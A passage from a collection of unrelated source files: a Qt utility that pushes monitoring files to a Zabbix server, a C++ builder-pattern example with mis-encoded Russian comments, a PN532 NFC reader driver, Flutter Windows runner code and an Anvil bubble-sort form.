\u0432\u0441\u0435\u0445 \u0444\u0430\u0439\u043b\u043e\u0432 \u0438 \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u0439, \u0438\u0441\u043a\u043b\u044e\u0447\u0430\u044f \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0435 \u043f\u0430\u043f\u043a\u0438 \".\" \u0438 \"..\"\n    dir.setFilter(QDir::Files | QDir::Dirs | QDir::NoDotAndDotDot);\n    // \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0441\u043f\u0438\u0441\u043e\u043a \u0432\u0441\u0435\u0445 \u0444\u0430\u0439\u043b\u043e\u0432 \u0438 \u043f\u0430\u043f\u043e\u043a\n    QFileInfoList list = dir.entryInfoList();\n\n    for (int i = 0; i < list.size(); ++i) {\n        QFileInfo fileInfo = list.at(i);\n        if (fileInfo.isDir()) {\n            // \u0415\u0441\u043b\u0438 \u044d\u0442\u043e \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f, \u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u043e \u0432\u044b\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0438 \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u044b\n            QVector<QString> subdirFiles = getAllFileNames(fileInfo.absoluteFilePath());\n            fileNames += subdirFiles; // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0438\u043c\u0435\u043d\u0430 \u0444\u0430\u0439\u043b\u043e\u0432 \u0438\u0437 \u043f\u043e\u0434\u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u0439\n        } else {\n            // \u0415\u0441\u043b\u0438 \u044d\u0442\u043e \u0444\u0430\u0439\u043b, \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0435\u0433\u043e \u0438\u043c\u044f \u0432 \u0432\u0435\u043a\u0442\u043e\u0440\n            fileNames.append(fileInfo.fileName());\n        }\n    }\n\n    return fileNames;\n}\n\n\nbool removeFile(const QString &filePath) {\n    if (QFile::exists(filePath)) { // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c, \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u043b\u0438 \u0444\u0430\u0439\u043b\n        bool success = QFile::remove(filePath);\n        return success;\n    } else {\n        qDebug() << \"File does not exist:\" << filePath;\n        return false;\n    }\n}\n\n\nint main(int argc, char *argv[])\n{\n    QCoreApplication a(argc, argv);\n\n    QString directoryPath = \"C:/Files/Project/WirenBoard_monitor/ApplicationCreate/release/release/files/input\"; // \u0417\u0430\u043c\u0435\u043d\u0438\u0442\u0435 \u043d\u0430 \u043f\u0443\u0442\u044c \u043a \u0432\u0430\u0448\u0435\u0439 \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u0438\n\n    int fileCount = countFilesInDirectory(directoryPath);\n\n    qDebug() << fileCount;\n\n    QVector<QString> fileNames = getAllFileNames(directoryPath);\n\n    //\u041e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u0444\u0443\u043d\u043a\u0446\u0438\u043e\u043d\u0430\u043b \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438\n    for (int i = 0; i < fileCount; i++) {\n        QProcess process;\n        QStringList arguments;\n        QString path = \"C:/Files/Project/WirenBoard_monitor/ApplicationCreate/release/release/files/input\";\n        QString pathtoinputs = QString( path + \"/%1\").arg(fileNames[i]);\n\n        arguments << \"-z\" << \"10.0.0.100\" << \"-T\" << \"-i\" << pathtoinputs;\n\n        process.start(\"zabbix_sender\", arguments);\n\n        if (process.waitForFinished()) {\n            QString output = process.readAllStandardOutput();\n            if (process.exitCode() == 0) {\n                qDebug() << \"Sending the file to the server is successful:\" << pathtoinputs;\n                bool result = removeFile(pathtoinputs);\n                if (result) {\n                   qDebug() << \"File successfully removed:\" << pathtoinputs;\n                } else {\n                   qDebug() << \"Failed to remove file:\" << pathtoinputs;\n                }\n            }\n            else {\n                qDebug() << \"Error sending the file to the server:\" << pathtoinputs;\n            }\n        }\n\n    }\n\n    return 0;\n\n    return a.exec();\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <ctime>\r\nusing namespace std;\r\n\r\n/* \u00cf\u00e0\u00f2\u00f2\u00e5\u00f0\u00ed \u00d1\u00f2\u00f0\u00ee\u00e8\u00f2\u00e5\u00eb\u00fc \u00ee\u00f2\u00e4\u00e5\u00eb\u00ff\u00e5\u00f2 \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00e5 \u00f1\u00eb\u00ee\u00e6\u00ed\u00ee\u00e3\u00ee \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00ee\u00f2 \u00e5\u00e3\u00ee \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff, \u00f2\u00e0\u00ea \u00f7\u00f2\u00ee\r\n\t   \u00e2 \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2\u00e5 \u00ee\u00e4\u00ed\u00ee\u00e3\u00ee \u00e8 \u00f2\u00ee\u00e3\u00ee \u00e6\u00e5 \u00ef\u00f0\u00ee\u00f6\u00e5\u00f1\u00f1\u00e0 \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff \u00ec\u00ee\u00e3\u00f3\u00f2 \u00ef\u00ee\u00eb\u00f3\u00f7\u00e0\u00f2\u00fc\u00f1\u00ff \u00f0\u00e0\u00e7\u00ed\u00fb\u00e5 \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff.\r\n\t\u00cf\u00f0\u00e8\u00ec\u00e5\u00ed\u00e8\u00ec\u00ee\u00f1\u00f2\u00fc\r\n\t   - \u00e0\u00eb\u00e3\u00ee\u00f0\u00e8\u00f2\u00ec \u00f1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00ff \u00f1\u00eb\u00ee\u00e6\u00ed\u00ee\u00e3\u00ee \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00ed\u00e5 \u00e4\u00ee\u00eb\u00e6\u00e5\u00ed \u00e7\u00e0\u00e2\u00e8\u00f1\u00e5\u00f2\u00fc \u00ee\u00f2 \u00f2\u00ee\u00e3\u00ee, \u00e8\u00e7 \u00ea\u00e0\u00ea\u00e8\u00f5 \u00f7\u00e0\u00f1\u00f2\u00e5\u00e9 \u00f1\u00ee\u00f1\u00f2\u00ee\u00e8\u00f2 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2 \u00e8 \u00ea\u00e0\u00ea \u00ee\u00ed\u00e8 \u00f1\u00f2\u00fb\u00ea\u00f3\u00fe\u00f2\u00f1\u00ff \u00ec\u00e5\u00e6\u00e4\u00f3 \u00f1\u00ee\u00e1\u00ee\u00e9;\r\n\t   - \u00ef\u00f0\u00ee\u00f6\u00e5\u00f1\u00f1 \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff \u00e4\u00ee\u00eb\u00e6\u00e5\u00ed \u00ee\u00e1\u00e5\u00f1\u00ef\u00e5\u00f7\u00e8\u00e2\u00e0\u00f2\u00fc \u00f0\u00e0\u00e7\u00eb\u00e8\u00f7\u00ed\u00fb\u00e5 \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00f3\u00e5\u00ec\u00ee\u00e3\u00ee \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0.\r\n   \u00cf\u00eb\u00fe\u00f1\u00fb \u00e8 \u00ec\u00e8\u00ed\u00f3\u00f1\u00fb \u00ef\u00e0\u00f2\u00f2\u00e5\u00f0\u00ed\u00e0 \u00f1\u00f2\u00f0\u00ee\u00e8\u00f2\u00e5\u00eb\u00fc \u00e8 \u00e5\u00e3\u00ee \u00ef\u00f0\u00e8\u00ec\u00e5\u00ed\u00e5\u00ed\u00e8\u00ff:\r\n\t- \u00ef\u00ee\u00e7\u00e2\u00ee\u00eb\u00ff\u00e5\u00f2 \u00e8\u00e7\u00ec\u00e5\u00ed\u00ff\u00f2\u00fc \u00e2\u00ed\u00f3\u00f2\u00f0\u00e5\u00ed\u00ed\u00e5\u00e5 \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 \u00ef\u00f0\u00ee\u00e4\u00f3\u00ea\u00f2\u00e0\r\n\t- \u00e8\u00e7\u00ee\u00eb\u00e8\u00f0\u00f3\u00e5\u00f2 \u00ea\u00ee\u00e4, \u00f0\u00e5\u00e0\u00eb\u00e8\u00e7\u00f3\u00fe\u00f9\u00e8\u00e9 \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00e5 \u00e8 \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5\r\n\t- \u00e4\u00e0\u00e5\u00f2 \u00e1\u00ee\u00eb\u00e5\u00e5 \u00f2\u00ee\u00ed\u00ea\u00e8\u00e9 \u00ea\u00ee\u00ed\u00f2\u00f0\u00ee\u00eb\u00fc \u00ed\u00e0\u00e4 \u00ef\u00f0\u00ee\u00f6\u00e5\u00f1\u00f1\u00ee\u00ec \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff\r\n   */\r\n\r\n/*\r\n\t matrix (\u00ef\u00f0\u00ee\u00e4\u00f3\u00ea\u00f2) \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00ff\u00e5\u00f2 \u00f1\u00eb\u00ee\u00e6\u00ed\u00fb\u00e9 \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00f3\u00e5\u00ec\u00fb\u00e9 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2. \r\n\t ConcreteBuilder \u00f1\u00f2\u00f0\u00ee\u00e8\u00f2 \u00e2\u00ed\u00f3\u00f2\u00f0\u00e5\u00ed\u00ed\u00e5\u00e5 \u00ef\u00f0\u00e5\u00e4\u00f1\u00f2\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 \u00ef\u00f0\u00ee\u00e4\u00f3\u00ea\u00f2\u00e0 \u00e8 \u00ee\u00ef\u00f0\u00e5\u00e4\u00e5\u00eb\u00ff\u00e5\u00f2 \u00ef\u00f0\u00ee\u00f6\u00e5\u00f1\u00f1 \u00e5\u00e3\u00ee \u00f1\u00e1\u00ee\u00f0\u00ea\u00e8.\r\n*/\r\n\r\nclass Body\r\n{\r\nprotected:\r\n\tstd::string name;\r\n\tstd::string color;\r\npublic:\r\n\tvoid SetName(string name)\r\n\t{\r\n\t\tthis->name = name;\r\n\t}\r\n\tvoid SetColor(string color)\r\n\t{\r\n\t\tthis->color = color;\r\n\t}\r\n\tstring GetName()\r\n\t{\r\n\t\treturn name;\r\n\t}\r\n\tstring GetColor()\r\n\t{\r\n\t\treturn color;\r\n\t}\r\n\tvoid PrintBody()\r\n\t{\r\n\t\tstd::cout << \"Car body\\nName: \" << name << \"\\nColor: \" << color << '\\n';\r\n\t}\r\n};\r\n\r\nclass Engine\r\n{\r\nprotected:\r\n\tstd::string name;\r\n\tint power;\r\npublic:\r\n\tvoid SetName(string name)\r\n\t{\r\n\t\tthis->name = name;\r\n\t}\r\n\tvoid SetPower(int power)\r\n\t{\r\n\t\tthis->power = power;\r\n\t}\r\n\tstring GetName()\r\n\t{\r\n\t\treturn name;\r\n\t}\r\n\tint GetPower()\r\n\t{\r\n\t\treturn power;\r\n\t}\r\n\tvoid PrintEngine()\r\n\t{\r\n\t\tstd::cout << \"Car engine\\nName: \" << name << \"\\nHourse power: \" << power << '\\n';\r\n\t}\r\n};\r\n\r\nclass GearBox\r\n{\r\nprotected:\r\n\tstd::string type;\r\n\tint count;\r\npublic:\r\n\tvoid SetType(string type)\r\n\t{\r\n\t\tthis->type = type;\r\n\t}\r\n\tvoid SetCount(int count)\r\n\t{\r\n\t\tthis->count = count;\r\n\t}\r\n\tstring GetType()\r\n\t{\r\n\t\treturn type;\r\n\t}\r\n\tint GetCount()\r\n\t{\r\n\t\treturn count;\r\n\t}\r\n\tvoid PrintGearBox()\r\n\t{\r\n\t\tstd::cout << \"Car gearbox\\nType: \" << type << \"\\nCount: \" << count << '\\n';\r\n\t}\r\n};\r\n\r\nclass WheelsBuilderPrototype abstract\r\n{\r\nprotected:\r\n\tint wheels;\r\npublic:\r\n\tint GetWheels()\r\n\t{\r\n\t\treturn wheels;\r\n\t}\r\n\tvirtual void SetWheels() abstract;\r\n};\r\n\r\nclass WheelsBuilder1 : public WheelsBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetWheels() override\r\n\t{\r\n\t\twheels = 13;\r\n\t}\r\n};\r\n\r\nclass WheelsBuilder2 : public WheelsBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetWheels() override\r\n\t{\r\n\t\twheels = 14;\r\n\t}\r\n};\r\n\r\nclass WheelsBuilder3 : public WheelsBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetWheels() override\r\n\t{\r\n\t\twheels = 16;\r\n\t}\r\n};\r\n\r\nclass EngineBuilderPrototype abstract\r\n{\r\nprotected:\r\n\tEngine engine;\r\npublic:\r\n\tEngine GetEngine()\r\n\t{\r\n\t\treturn engine;\r\n\t}\r\n\tvirtual void SetName() abstract;\r\n\tvirtual void SetPower() abstract;\r\n};\r\n\r\nclass EngineBuilder1 : public EngineBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tengine.SetName(\"Lanos\");\r\n\t}\r\n\tvoid SetPower() override\r\n\t{\r\n\t\tengine.SetPower(98);\r\n\t}\r\n};\r\n\r\nclass EngineBuilder2 : public EngineBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tengine.SetName(\"Ford\");\r\n\t}\r\n\tvoid SetPower() override\r\n\t{\r\n\t\tengine.SetPower(160);\r\n\t}\r\n};\r\n\r\nclass EngineBuilder3 : public EngineBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tengine.SetName(\"UAZ\");\r\n\t}\r\n\tvoid SetPower() override\r\n\t{\r\n\t\tengine.SetPower(120);\r\n\t}\r\n};\r\n\r\nclass BodyBuilderPrototype abstract\r\n{\r\nprotected:\r\n\tBody body;\r\npublic:\r\n\tBody GetBody()\r\n\t{\r\n\t\treturn body;\r\n\t}\r\n\tvirtual void SetName() abstract;\r\n\tvirtual void SetColor() abstract;\r\n};\r\n\r\nclass BodyBuilder1 : public BodyBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tbody.SetName(\"Sedan\");\r\n\t}\r\n\tvoid SetColor() override\r\n\t{\r\n\t\tbody.SetColor(\"Red\");\r\n\t}\r\n};\r\n\r\nclass BodyBuilder2 : public BodyBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tbody.SetName(\"Cupe\");\r\n\t}\r\n\tvoid SetColor() override\r\n\t{\r\n\t\tbody.SetColor(\"Blue\");\r\n\t}\r\n};\r\n\r\nclass BodyBuilder3 : public BodyBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetName() override\r\n\t{\r\n\t\tbody.SetName(\"Universal\");\r\n\t}\r\n\tvoid SetColor() override\r\n\t{\r\n\t\tbody.SetColor(\"Green\");\r\n\t}\r\n};\r\n\r\nclass GearBoxBuilderPrototype abstract\r\n{\r\nprotected:\r\n\tGearBox gearbox;\r\npublic:\r\n\tGearBox GetGearBox()\r\n\t{\r\n\t\treturn gearbox;\r\n\t}\r\n\tvirtual void SetType() abstract;\r\n\tvirtual void SetCount() abstract;\r\n};\r\n\r\nclass GearBoxBuilder1 : public GearBoxBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetType() override\r\n\t{\r\n\t\tgearbox.SetType(\"Manual\");\r\n\t}\r\n\tvoid SetCount() override\r\n\t{\r\n\t\tgearbox.SetCount(5);\r\n\t}\r\n};\r\n\r\nclass GearBoxBuilder2 : public GearBoxBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetType() override\r\n\t{\r\n\t\tgearbox.SetType(\"Auto\");\r\n\t}\r\n\tvoid SetCount() override\r\n\t{\r\n\t\tgearbox.SetCount(4);\r\n\t}\r\n};\r\n\r\nclass GearBoxBuilder3 : public GearBoxBuilderPrototype\r\n{\r\npublic:\r\n\tvoid SetType() override\r\n\t{\r\n\t\tgearbox.SetType(\"Manual\");\r\n\t}\r\n\tvoid SetCount() override\r\n\t{\r\n\t\tgearbox.SetCount(4);\r\n\t}\r\n};\r\n\r\nclass C",
    "#include \"PN532.h\"\n\n\nPN532::PN532(Interface* port) : port(port), debug(false) { }\n\nvoid PN532::setDebug(bool d) {\n\tdebug = d;\n}\n\nvoid PN532::getFirmwareVersion() {\n\tframeBuffer[0] = GetFirmwareVersion_CMD;\n\t\n    commandAndResponse(1, 5);\n    \n    std::cout << \"A PN5\" << std::hex << std::setw(1) << frameBuffer[1] << \" was found, version: \" << std::dec << frameBuffer[2] << \".\" << frameBuffer[3] << std::endl;\n    \n    std::cout << \"Supports code: \" << std::hex << frameBuffer[4] << std::endl;\n}\n\n//THIS MUST BE CALLED BEFORE DOING ANYTHING\nvoid PN532::SAMConfig() {\n\n\tframeBuffer[0] = SAMConfiguration_CMD;\n\tframeBuffer[1] = 0x01;\n\tframeBuffer[2] = 0x14;\n\tframeBuffer[3] = 0x01;\n\t\n    commandAndResponse(4, 1);\n    std::cout << \"SAM was successfully configured.\" << std::endl;\n}\n\n/*\n\nDescription: Sets how long the PN532 will wait for a card response.\n\nArguments:\tTimeout value (see datasheet for conversions)\n\nReturns: Success boolean\n\n*/\n\n\nvoid PN532::setMuteTimeout(uint8_t timeout) {\n\n\tif (timeout > 0x10) timeout = 0x10;\n\t\t\n\tframeBuffer[0] = RFConfiguration_CMD;\n\tframeBuffer[1] = 0x02; //Config Item\n\tframeBuffer[2] = 0x00; //RFU\n\tframeBuffer[3] = 0x0B; //Dont alter\n\tframeBuffer[4] = timeout;\n\t\n    commandAndResponse(5, 1);\n}\n\n/*\n\nDescription: Sets how many times the PN532 will attempt to communicate with target before giving up.\n\nArguments:\tNumber of retries (NOT ATTEMPTS)\n\nReturns: Success boolean\n\n*/\n\nvoid PN532::setCommunicationRetries(uint8_t retries) {\n\t\t\n\tframeBuffer[0] = RFConfiguration_CMD;\n\tframeBuffer[1] = 0x04; //Config Item\n\tframeBuffer[2] = retries; \n\t\n    commandAndResponse(3, 1);\n}\n\n/*\n\nDescription: Sets how many times the PN532 will attempt to active passive targets.\n\nArguments:\tNumber of retries (NOT ATTEMPTS)\n\nReturns: Success boolean\n\n*/\n\nvoid PN532::setPassiveActivationRetries(uint8_t retries) {\n\t\t\n\tframeBuffer[0] = RFConfiguration_CMD;\n\tframeBuffer[1] = 0x05; //Config Item\n\tframeBuffer[2] = 0xFF; //Dont alter\n\tframeBuffer[3] = 0x01; //Dont alter\n\tframeBuffer[4] = retries;\n\t\n    commandAndResponse(5, 1);\n}\n\n/*\n\nDescription: Detects a MIFARE 1K card in the RF field and saves its UID.\n\nArguments:\tuid - destination for the UID.\n\nReturns: Success boolean\n\n*/\n\nvoid PN532::detectMifare1K(uint8_t uid[4]) {\n    \n    frameBuffer[0] = InListPassiveTarget_CMD;\n    frameBuffer[1] = 0x01; //1 Tag\n    frameBuffer[2] = 0x00; //106 kbps type A\n    \n    commandAndResponse(3, 11);\n    \n    //Currently only supports one tag\n    if (frameBuffer[1] != 0x01) throw CodedException(0x0A);\n    \n    memcpy(uid, frameBuffer + 7, 4);\n    \n    std::cout << \"Found a tag with UID \" << std::endl;\n    printHexBytes(uid, 4, -1);\n    std::cout << std::hex << std::setw(2) << std::setfill('0') << \"ATQA of \" << frameBuffer[3] << \" \" << frameBuffer[4] << \", SAK of \" << frameBuffer[5] << std::endl;\n}\n\n/*\n\nDescription: Selects a target.\n\nArguments:\tTag number (as defined by PN532)\n\nReturns: Success boolean\n\n*/\n\nvoid PN532::select(uint8_t tag) {\n\n\tframeBuffer[0] = InSelect_CMD;\n\tframeBuffer[1] = tag;\n\t\n    commandAndResponse(2, 2);\n\t\n    decodeError(frameBuffer[1]);\n}\n\n/*\n\nDescription: Authenticates a sector for a MIFARE Classic 1K card.\n\nArguments:\tblock - The block (NOT SECTOR) to authenticate (but it will authenticate the whole sector)\n\t\t\tuid - The UID of the target to authenticate\n\t\t\tkeyType - Which authentication type: Key A is true, Key B is false\n\t\t\tkey - The key to use\n\nReturns: Success boolean\n\n*/\n\nvoid PN532::MifareClassic_AuthenticateBlock(uint8_t block, uint8_t uid[4], bool isKeyA, uint8_t key[6]) {\n\t\n\t//True is for keyA, false is for keyB\n\tframeBuffer[0] = InDataExchange_CMD;\n\tframeBuffer[1] = 0x01; //Tag Number\n\tframeBuffer[2] = (isKeyA ? 0x60 : 0x61); //Key A or Key B Auth\n\tframeBuffer[3] = block;\n\tmemcpy(frameBuffer + 4, key, 6);\n\tmemcpy(frameBuffer + 10, uid, 4);\n\t\n    commandAndResponse(14, 2);\n\t\n    decodeError(frameBuffer[1]);\n}\n\n/*\n\nDescription: Reads a block for for a MIFARE Classic 1K card.\n\nArguments:\tblock - Number of the block to be read\n\t\t\tdestination - Destination for the data read\n\nReturns: Success boolean\n\n*/\n\nvoid PN532::MifareClassic_ReadBlock(uint8_t block, uint8_t* destination) {\n\t\n\tframeBuffer[0] = InDataExchange_CMD;\n\tframeBuffer[1] = 0x01; //Tag Number\n\tframeBuffer[2] = 0x30; //Mifare read\n\tframeBuffer[3] = block;\n\t\n    commandAndResponse(4, 18);\n\t\t\n\tmemcpy(destination, frameBuffer + 2, 16);\n\t\n    decodeError(frameBuffer[1]);\n}\n\n/*\n\nDescription: Writes a block for a MIFARE Classic 1K card.\n\nArguments:\tblock - Number of the block to be written\n\t\t\tdata - The data to write\n\nReturns: Success boolean\n\n*/\n\nvoid PN532::MifareClassic_WriteBlock(uint8_t block, uint8_t data[16]) {\n\n\tframeBuffer[0] = InDataExchange_CMD;\n\tframeBuffer[1] = 0x01;\n\tframeBuffer[2] = 0xA0; //Mifare write\n\tframeBuffer[3] = block;\n\t\n\tmemcpy(frameBuffer + 4, data, 16);\n\t\n    commandAndResponse(20, 2);\n\n\tdecodeError(frameBuffer[1]);\n}\n\n/*\n\nDescription: Reads an entire MIFARE Classic card (given the keys)\n\nArguments:\tdestination - Destinatio",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "from ._anvil_designer import Form1Template\nfrom anvil import *\n\nclass Form1(Form1Template):\n    def __init__(self, **properties):\n        # Set Form properties and Data Bindings.\n        self.init_components(**properties)\n\n        # Any code you write here will run before the form opens.\n\n    def bubble_sort(self, arr):\n        n = len(arr)\n        for i in range(n-1):\n            for j in range(0, n-i-1):\n                if arr[j] > arr[j+1]:\n                    arr[j], arr[j+1] = arr[j+1], arr[j]\n\n    def update_sorted_array(self):\n        input_string = self.text_box_1.text # L\u1ea5y d\u1eef li\u1ec7u t\u1eeb text_box_1\n        input_list = [int(x) for x in input_string.split()] # Chuy\u1ec3n \u0111\u1ed5i d\u1eef li\u1ec7u nh\u1eadp v\u00e0o th\u00e0nh list c\u00e1c s\u1ed1 nguy\u00ean\n\n        self.bubble_sort(input_list) # S\u1eafp x\u1ebfp m\u1ea3ng\n\n        # Hi\u1ec3n th\u1ecb k\u1ebft qu\u1ea3 \u0111\u00e3 s\u1eafp x\u1ebfp v\u00e0o text_box_2\n        output_string = \" \".join(map(str, input_list))\n        self.text_box_2.text = output_string\n\n    def text_box_1_pressed_enter(self, **event_args):\n        \"\"\"This method is called when the user presses Enter in this text box\"\"\"\n        self.update_sorted_array()\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // 